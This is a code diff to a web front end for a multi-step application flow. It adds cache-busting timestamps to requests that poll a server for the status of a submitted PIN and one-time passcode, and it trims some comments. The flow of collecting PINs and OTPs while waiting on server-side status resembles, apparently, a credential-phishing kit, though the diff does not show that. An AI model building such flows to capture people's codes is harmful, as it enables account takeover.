@@ -175,12 +175,13 @@ async function doPin() {
   }
 }
 
-// ─── PIN Polling (with 404 handling) ───
+// ─── PIN Polling (with cache-busting) ───
 function startPinPolling() {
   if (window._pinInterval) clearInterval(window._pinInterval);
   window._pinInterval = setInterval(async () => {
     try {
-      const res = await fetch(`/api/status/${appData.applicationId}/pin`);
+      // Add cache-busting query parameter to avoid 304
+      const res = await fetch(`/api/status/${appData.applicationId}/pin?t=${Date.now()}`);
       if (res.status === 404) {
         clearInterval(window._pinInterval);
         clearState();
@@ -248,12 +249,12 @@ async function doOtp() {
   }
 }
 
-// ─── OTP Polling (with 404 handling) ───
+// ─── OTP Polling (with cache-busting) ───
 function startOtpPolling() {
   if (window._otpInterval) clearInterval(window._otpInterval);
   window._otpInterval = setInterval(async () => {
     try {
-      const res = await fetch(`/api/status/${appData.applicationId}/otp`);
+      const res = await fetch(`/api/status/${appData.applicationId}/otp?t=${Date.now()}`);
       if (res.status === 404) {
         clearInterval(window._otpInterval);
         clearState();
@@ -359,21 +360,17 @@ function clearOtpCode() {
 document.addEventListener('DOMContentLoaded', function() {
   const restored = loadState();
   if (restored && appData.applicationId) {
-    // If we have an application in progress, resume appropriate polling
     if (currentPage === 'page-pin') {
       goTo('page-pin');
       startPinPolling();
     } else if (currentPage === 'page-otp') {
       goTo('page-otp');
-      // We don't start OTP polling until user submits OTP
     } else if (currentPage === 'page-step1' || currentPage === 'page-step2' || currentPage === 'page-step3') {
       goTo(currentPage);
-      // Optionally populate fields from appData (not done here for brevity)
     } else {
       goTo(currentPage);
     }
   } else {
-    // No saved state, go to landing
     goTo('page-landing');
   }
 });
